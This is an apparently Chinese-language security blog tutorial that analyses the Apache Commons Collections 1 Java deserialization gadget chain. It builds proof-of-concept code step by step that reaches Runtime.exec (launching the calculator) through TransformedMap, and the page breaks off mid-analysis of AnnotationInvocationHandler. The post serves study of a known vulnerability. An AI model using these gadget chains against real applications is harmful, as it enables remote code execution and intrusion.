<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <meta name="author" content="Leihehe" />
  <meta name="description" content="我该说些什么呢？" />
  
  
  <title>
    
      Java反序列化漏洞之利用链分析集合(4) 
      
      
      |
    
     LeiH - Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon1.png">
    <link rel="icon" href="/images/favicon1.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar_me.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">Shulei He</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">Java反序列化漏洞之利用链分析集合(4)</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2022-06-09 09:43:07
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="Categories"></i>
                
                <span class="span--category">
                  <a href="/categories/Web-Security/" title="Web Security">
                    <b>#</b> Web Security
                  </a>
                </span>
                
                <span class="span--category">
                  <a href="/categories/Web-Security/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="JAVA反序列化漏洞">
                    <b>#</b> JAVA反序列化漏洞
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="Tags"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/Web-Security/" title="Web Security">
                    #Web Security
                  </a>
                </span>
                
                <span class="span--tag mr-8">
                  <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化">
                    #Java反序列化
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在搞清楚Java反射机制、RMI和基本的Java反序列化漏洞流程后，下一步便是分析Java反序列化漏洞的经典利用链了。但这对大部分人来说都并不容易，我在网上查阅了大量资料，大部分文章对于新手来说并不友好 - 刚开始我甚至搞不清楚测试反序列化漏洞的环境应该如何搭建，在这种情况下，又何谈分析代码。</p>
<p>这篇将集合所有经典的反序列化漏洞利用链的详细讲解（包括一些环境搭建），希望帮助更多人、也包括我自己，能够认识、理解利用链的深层原理。</p>
<blockquote>
<p>Do not become a script kiddie.</p>
</blockquote>
<p>代码同步项目：<a target="_blank" rel="noopener" href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a></p>
<span id="more"></span>

<h1 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h1><p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">见此篇</a></p>
<h1 id="Apache-Commons-Collections-利用链"><a href="#Apache-Commons-Collections-利用链" class="headerlink" title="Apache Commons Collections 利用链"></a>Apache Commons Collections 利用链</h1><h2 id="什么是Commons-Collections"><a href="#什么是Commons-Collections" class="headerlink" title="什么是Commons Collections"></a>什么是Commons Collections</h2><p>有编程基础的同学应该知道，无论是<code>C Language, Java, Python</code>还是其他语言，都有**Library(库)**。在<code>Java</code>中，我们用<code>import</code>引入库，这样我们就可以使用被引入的库中的一些function了。而Apache Commons Collections就是一个第三方基础库。</p>
<blockquote>
<p>It provides several features to make collection handling easy. It provides many new interfaces, implementations and utilities.</p>
</blockquote>
<p>它提供了一些功能，可以更方便的管理Collection集合 - 因为方便，Commons Collections被广泛用于各种Java应用的开发。其中反序列化漏洞就出现在这个库中，这意味着使用<strong>该库的漏洞版本</strong>的Java应用会面临<strong>反序列化漏洞</strong>的威胁。而我们的目的，就是研究这个库是如何产生并被利用反序列化漏洞的。</p>
<h2 id="Commons-Collections-1"><a href="#Commons-Collections-1" class="headerlink" title="Commons Collections 1"></a>Commons Collections 1</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="下载准备"><a href="#下载准备" class="headerlink" title="下载准备"></a>下载准备</h4><ul>
<li><p>IntelliJ IDEA</p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/commons/collections/binaries/">apache commons collection 3.1版本</a></p>
</li>
<li><p>JDK1.7(8u71前版本)</p>
</li>
</ul>
<h4 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h4><h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h5><p>首先创建一个<strong>Java</strong>项目，JDK记得选1.7版本的。</p>
<p>在<code>File-&gt;Project Structure-&gt;Modules-&gt;Dependencies</code>点右边的加号：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154615757.png" alt="image-20210731154615757"></p>
<p>导入我们下载好的cc jar包</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154659615.png" alt="image-20210731154659615"></p>
<p>配置就完成了。这时候我们可以看到<strong>library</strong>处已被引入。<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731160311855.png" alt="image-20210731160311855"></p>
<p>在Artifacts处也应该导入，具体步骤见<a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之Ysoserial安装配置</a>中的<strong>WebServer环境搭建</strong>章节。</p>
<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h5><p>也可以通过创建Maven项目，添加如下dependency:</p>
<pre><code class="xml">    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
            &lt;version&gt;3.1&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<h3 id="TransformedMap版本-POC构造过程"><a href="#TransformedMap版本-POC构造过程" class="headerlink" title="TransformedMap版本 - POC构造过程"></a>TransformedMap版本 - POC构造过程</h3><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><p>安全研究的前辈们为我们发现并构造了利用这个漏洞的POC，我们现在就需要分析这条利用链的原理。</p>
<p>我们的利用链需要用到如下的Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>TransformedMap</li>
<li>AnotationInvocationHandler</li>
</ul>
<h4 id="第一步：InvokerTransformer"><a href="#第一步：InvokerTransformer" class="headerlink" title="第一步：InvokerTransformer"></a>第一步：InvokerTransformer</h4><p>在<code>InvokerTransformer</code>中，我们一眼可以看到如下的<strong>反射机制</strong>的使用：</p>
<pre><code class="java">    public Object transform(Object input) &#123;
        if (input == null) &#123;
            return null;
        &#125; else &#123;
            try &#123;
                Class cls = input.getClass();//此处是关键
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);//此处是关键
                return method.invoke(input, this.iArgs);//此处是关键
            &#125; 
            ...//此处省略
&#125;
</code></pre>
<p>在它的<code>transform()</code>方法中，将先get到了<code>input</code>所在的Class，然后，获取Class中的<code>method(this.iMethodName, this.iParamTypes)</code>，再<code>method.invoke(input, this.iArgs)</code>。那么我们是否可以控制这些变量来完成一个反射呢？</p>
<p><code>InvokerTransformer</code>有两个<strong>constructor</strong>，其中一个可以让我们传入以上需要用到的<code>iMethodName,iParamTypes,iArgs</code></p>
<pre><code class="java">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    &#125;
</code></pre>
<p>那么我们就可以利用这个Class来触发RCE了！如果我们想要执行<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>的效果，应该怎么办呢？</p>
<p>把它和上面的<code>transform()</code>里的代码对照，我们将它写成反射的形式:</p>
<pre><code class="java">Class cls = input.getClass();//input -&gt; Runtime.getRuntme() 这里的Cls-&gt; Runtime.class
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
//iMethodName -&gt; exec 
//paramTypes -&gt; String.class
return method.invoke(input, this.iArgs);//iArgs -&gt; &quot;calc&quot;
</code></pre>
<p>一个简易的POC：</p>
<pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;

        //首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;);
        //构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到
        Object input = Class.forName(&quot;java.lang.Runtime&quot;).getDeclaredMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;),null);
        //执行payload
        invokerTransformer.transform(input);
    &#125;

&#125;
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731192120814.png" alt="image-20210731192120814"></p>
<p>让我们来模拟一下客户端和服务器之间序列化和反序列化的过程：</p>
<p><strong>POC</strong></p>
<pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;

        /*
        * 客户端构造payload，并序列化文件
        * */
        //首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;tm.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(invokerTransformer);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
        * 服务端反序列化读取，并执行payload
        * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;tm.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        InvokerTransformer inv = (InvokerTransformer) objectInputStream.readObject();

        //构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到
        Object input = Class.forName(&quot;java.lang.Runtime&quot;).getDeclaredMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;),null);
        //执行payload
        inv.transform(input);

    &#125;

&#125;
</code></pre>
<p>我们运行一下，成功弹出了计算器！</p>
<p>但是，我们来分析一下，这样写出来的POC有什么限制：</p>
<blockquote>
<p>服务端的开发人员需要“帮助”我们做以下事情，才能触发漏洞：</p>
<ul>
<li>把反序列化后的Object强制转化为InvokerTransformer类型</li>
<li>构造Input - Runtime实例</li>
<li>执行InvokerTransformer中的transform方法，并将Runtime实例以方法参数传入。</li>
</ul>
</blockquote>
<p>可以说这样的POC基本无法用于现实中的Java应用里，毫无意义。</p>
<p>那么我们怎么改造呢？</p>
<h4 id="第二步：ChainedTransformer"><a href="#第二步：ChainedTransformer" class="headerlink" title="第二步：ChainedTransformer"></a>第二步：ChainedTransformer</h4><p>首先来解决<code>input</code>的问题，我们想要自己来写<code>input</code>，这样有更多的自主性。而<code>ChainedTransformer</code>类就满足我们的要求。正如其名，它有着把各个<code>transformer</code>串起来的功能。</p>
<p>在<code>ChainedTransformer</code>中，有这样一个method：</p>
<pre><code class="java">    public Object transform(Object object) &#123;
        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;
            object = this.iTransformers[i].transform(object);
        &#125;
        return object;
    &#125;
</code></pre>
<p>它循环遍历了<code>iTransformers</code>中的每一个元素 - 每一次循环，它都会把<code>该元素.transform(object)</code>的结果（一个对象）赋值给<code>object</code>，并返回。</p>
<p>这意味着，下一个元素执行的<code>transform()</code>方法中的参数就是上一个元素执行<code>transform()</code>方法的返回值。</p>
<p>而在<code>ChainedTransformer</code>的构造函数中我们可以控制<code>iTransformers</code>变量（<code>Transformer[]</code>类型），因为<code>InvokerTransformer implements Transformer</code>，那么我们之前的<code>InvokerTransformer</code>也可放在<code>Transformer[]</code>中。</p>
<pre><code class="java">public ChainedTransformer(Transformer[] transformers) &#123;
    this.iTransformers = transformers;
&#125;
</code></pre>
<p>所以构想：让我们构造的<code>input</code>(Runtime实例)作为第一个遍历元素的返回值，再执行第二个元素的transform时，刚好就传入了input这个参数了。</p>
<p>但问题是，怎么让我们构造的<code>input</code>(Runtime实例)能被<code>Transformer</code>类或其子类的<code>transform()</code>方法中的返回呢？</p>
<h4 id="第三步：ConstantTransformer"><a href="#第三步：ConstantTransformer" class="headerlink" title="第三步：ConstantTransformer"></a>第三步：ConstantTransformer</h4><p>我们找到了<code>ConstantTransformer</code>类，它是实现<code>Transformer</code>类的，可以被放进<code>Transformer[]</code>数组。在类里，它有我们想要的<code>transform()</code>方法，且刚好就返回了<code>iConstant</code>，我们可以在构造函数中传入<code>Runtime.getRuntime()</code>这个Object。</p>
<pre><code class="java">    public ConstantTransformer(Object constantToReturn) &#123;//Constructor -》我们可以控制iconstant
        this.iConstant = constantToReturn;
    &#125;

    public Object transform(Object input) &#123;//返回iconstant
        return this.iConstant;
    &#125;
</code></pre>
<p>这样我们的链就可以连起来了：</p>
<pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;
        /*
        * 客户端构造payload，并序列化文件
        * */
        Transformer[] transformers = new Transformer[]&#123;
                //返回input(Runtime实例)，并将它作为下面的transform()的方法参数传入
                new ConstantTransformer(Runtime.getRuntime()),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;tm.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(chainedTransformer);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
        * 服务端反序列化读取，并触发漏洞
        * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;tm.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        ChainedTransformer inv = (ChainedTransformer) objectInputStream.readObject();
        //触发漏洞
        inv.transform(&quot;Leihehe&quot;);//这里任何值都可以,因为ConstantTransformer.transform(object)中的object中没有被用到

    &#125;

&#125;
</code></pre>
<p>原本想要的计算器没有出现，出现了错误：编译器提示<code>Runtime</code>没有实现<code>Serializable</code>，所以不能被序列化和反序列化。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731202443280.png" alt="image-20210731202443280"></p>
<p>那我们就采用反射的方法来获取Runtime实例，让服务器在反序列化的时候生成Runtime实例：</p>
<pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;
        /*
        * 客户端构造payload，并序列化文件
        * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;tm.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(chainedTransformer);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
        * 服务端反序列化读取，并触发漏洞
        * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;tm.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        ChainedTransformer inv = (ChainedTransformer) objectInputStream.readObject();
        //触发漏洞
        inv.transform(&quot;Leihehe&quot;);//这里任何值都可以

    &#125;

&#125;
</code></pre>
<p>成功弹出计算器！但这样漏洞可以触发的范围依然不大，仍需要开发者在服务端将object转换为<code>ChainedTransformer</code>类型，且执行<code>transform</code>方法，我们需要扩大漏洞触发范围。</p>
<h4 id="第四步：TransformedMap-put"><a href="#第四步：TransformedMap-put" class="headerlink" title="第四步：TransformedMap - put()"></a>第四步：TransformedMap - put()</h4><blockquote>
<p><code>Apache Commons Collections</code> 实现了一个 <code>TransformedMap</code> 类，该类是对 Java 标准数据结构 <code>Map</code> 接口的一个扩展 。</p>
</blockquote>
<p>在<code>TransformedMap</code>类中，我们可以发现以下methods</p>
<pre><code class="java">    protected Object transformKey(Object object) &#123;
        return this.keyTransformer == null ? object : this.keyTransformer.transform(object);
        //若keyTransformer不为null，则执行其transform方法
    &#125;

    protected Object transformValue(Object object) &#123;
        return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
        //若valueTransformer不为null，则执行其transform方法
    &#125;    
    protected Object checkSetValue(Object value) &#123;
        return this.valueTransformer.transform(value);
    &#125;
</code></pre>
<p>这三个methods都会调用到对象的<code>transform</code>()方法，但都是<code>protected</code>属性，无法被外界访问，那么我们怎么触发到这三个方法呢？</p>
<p>继续在该Class中查看，发现了<code>put()</code>方法：</p>
<pre><code class="java">    public Object put(Object key, Object value) &#123;//如果使用了put方法，那么就会执行transform方法
        key = this.transformKey(key);//这里调用了我们想要调用的方法
        value = this.transformValue(value);//这里调用了我们想要调用的方法
        return this.getMap().put(key, value);
    &#125;
</code></pre>
<p>那<code>keyTransformer</code>和<code>valueTransformer</code>可控吗？</p>
<p><code>TransformedMap</code>类中的constructor传入两个转换链，一个是<code>keyTransformer</code>一个是<code>valueTransformer</code></p>
<pre><code class="java">    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    &#125;
</code></pre>
<p>而它的<code>decorate()</code>静态方法会返回新的<code>TransformedMap</code>实例</p>
<pre><code class="java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;
    return new TransformedMap(map, keyTransformer, valueTransformer);
&#125;
</code></pre>
<p>那么我们可以利用<code>TransformedMap.decorate()</code>来获取到一个新的<code>TransformedMap Instance</code></p>
<p><strong>POC：</strong></p>
<pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;
        /*
        * 客户端构造payload，并序列化文件
        * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;

        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put(&quot;1&quot;,&quot;1&quot;);
        Map myMap = TransformedMap.decorate(map, null, chainedTransformer);//final malicious map

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;tm.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(myMap);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
        * 服务端反序列化读取，并触发漏洞
        * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;tm.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Map mapObj = (Map) objectInputStream.readObject();
        //触发漏洞
        mapObj.put(&quot;aa&quot;,&quot;bb&quot;);

    &#125;

&#125;
</code></pre>
<p>计算器成功弹出！</p>
<p>现在范围扩大了，因为我们用到了更为常见的Map和<code>put()</code>触发。</p>
<p>我们更理想化的攻击方式是，服务器端只要反序列化<code>readObject()</code>就能触发反序列化漏洞。可惜的是，安全研究的前辈们发现并未有【重写了<code>readObject()</code>方法且方法内可以调用<code>MapObj.put()</code>方法】的Class。</p>
<h4 id="第五步：TransformedMap-checkSetValue"><a href="#第五步：TransformedMap-checkSetValue" class="headerlink" title="第五步：TransformedMap - checkSetValue()"></a>第五步：TransformedMap - checkSetValue()</h4><p>还记得第四步的时候，我们在<code>TransformedMap</code>类中还发现了一个方法，但<strong>并未利用</strong>吗？</p>
<pre><code class="java">protected Object checkSetValue(Object value) &#123;
    return this.valueTransformer.transform(value);
&#125;
</code></pre>
<p>既然<code>put()</code>不可以再进一步利用了，这个方法会不会有更多利用空间呢？<code>TransformedMap</code>类继承了<code>AbstractInputCheckedMapDecorator</code>类，我们跟进去看一下。搜索<code>checkSetValue()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222403673.png" alt="image-20210731222403673"></p>
<p>这里<code>MapEntry</code>里出现了<code>checkSetValue()</code>，那我们只要保证<code>this.parent</code>是指向<code>TransformedMap</code>类的对象就可以了。</p>
<p>我们看看<code>this.parent</code>都在哪些地方可以被赋值呢？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222703200.png" alt="image-20210731222703200"></p>
<p>分别是在<code>EntrySetIterator</code>和<code>EntrySet</code>的<code>constructor</code>里可以被赋值！但这是<strong>不同</strong>Class的<code>parent</code>，我们需要的是<code>MapEntry</code>里的<code>parent</code>，继续查看代码，发现：<code>EntrySetIterator</code>中的next()方法会将自身的<code>parent</code>传入<code>MapEntry</code>，而<code>EntrySet</code>的<code>iterator</code>方法又会创建一个新的<code>EntrySetIterator</code>，将它的parent传入<code>EntrySetIterator</code>，这样就连起来了 - <code>new EntrySet(set,parent).iterator().next()</code>就能够传入我们的parent。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731223154142.png" alt="image-20210731223154142"></p>
<p>接着我们发现，<code>AbstractInputCheckedMapDecorator</code>里还有一个<code>entrySet()</code>，因为我们的<code>TransformedMap</code>就是它的子类，所以我们可以直接用我们的<code>TransformedMap</code>去call这个method,一切就连起来了。</p>
<pre><code class="java">    public Set entrySet() &#123;
        return (Set)(this.isSetValueChecking() ? new AbstractInputCheckedMapDecorator.EntrySet(super.map.entrySet(), this) : super.map.entrySet());//这里会创建一个新的entrySet，把自身作为parent传入constructor
    &#125;
</code></pre>
<p><strong>POC：</strong></p>
<pre><code class="java">public class TransformedMapExploit &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;
        /*
        * 客户端构造payload，并序列化文件
        * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;

        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put(&quot;1&quot;,&quot;1&quot;);
        Map myMap = TransformedMap.decorate(map, null, chainedTransformer);//malicious map
        Map.Entry finalMap = (Map.Entry) myMap.entrySet().iterator().next();//传入parent

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;tm.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(finalMap);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
        * 服务端反序列化读取，并触发漏洞
        * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;tm.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Map.Entry entry = (Map.Entry) objectInputStream.readObject();
        entry.setValue(&quot;leihehe&quot;);//触发漏洞

    &#125;

&#125;
</code></pre>
<p>原本以为成功了，结果发现：<code>MapEntry</code>不能被序列化<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225703306.png" alt="image-20210731225703306"></p>
<p>去掉序列化和反序列化过程，成功弹出计算器</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225956030.png" alt="image-20210731225956030"></p>
<h4 id="第六步：-AnnotationInvocationHandler"><a href="#第六步：-AnnotationInvocationHandler" class="headerlink" title="第六步： AnnotationInvocationHandler"></a>第六步： AnnotationInvocationHandler</h4><p>虽然在第五步我们不能序列化，但幸运的是<code>AnnotationInvocationHandler</code>中出现了我们想要的内容：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731220804329.png" alt="image-20210731220804329"></p>
<p><code>AnnotationInvocationHandler</code>拥有自己的<code>readObject()</code>方法，且方法中涉及到了<code>Map</code>的操作，让我们来详细分析一下。</p>
<pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;
        var1.defaultReadObject();
        AnnotationType var2 = null;//var2代表AnnotationType（注释类型） -》 为空

        try &#123;
